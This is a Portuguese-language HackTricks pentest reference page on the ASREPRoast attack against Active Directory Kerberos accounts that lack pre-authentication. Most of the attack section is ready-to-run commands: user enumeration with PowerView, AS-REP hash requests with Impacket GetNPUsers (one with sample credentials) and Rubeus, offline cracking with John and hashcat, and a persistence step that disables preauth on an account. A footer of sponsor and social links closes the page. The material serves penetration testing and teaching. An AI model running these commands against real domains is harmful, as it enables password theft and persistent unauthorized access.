## ASREPRoast

O ataque ASREPRoast procura por usuários sem o atributo de pré-autenticação Kerberos necessário (_**DONT_REQ_PREAUTH**_).

Isso significa que qualquer pessoa pode enviar uma solicitação AS_REQ para o DC em nome de qualquer um desses usuários e receber uma mensagem AS_REP. Esse último tipo de mensagem contém um pedaço de dados criptografados com a chave de usuário original, derivada de sua senha. Em seguida, usando essa mensagem, a senha do usuário pode ser quebrada offline.

Além disso, **não é necessário ter uma conta de domínio para realizar esse ataque**, apenas conexão com o DC. No entanto, **com uma conta de domínio**, uma consulta LDAP pode ser usada para **recuperar usuários sem pré-autenticação Kerberos** no domínio. **Caso contrário, os nomes de usuário devem ser adivinhados**.

#### Enumerando usuários vulneráveis (necessita de credenciais de domínio)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### Solicitação de mensagem AS_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Usando o Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
O AS-REP Roasting com o Rubeus irá gerar um 4768 com um tipo de criptografia de 0x17 e um tipo de pré-autenticação de 0.
{% endhint %}

### Quebrando
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```
### Persistência

Forçar a não exigência de **preauth** para um usuário onde você tem permissões de **GenericAll** (ou permissões para escrever propriedades):
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## Referências

[**Mais informações sobre AS-RRP Roasting em ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
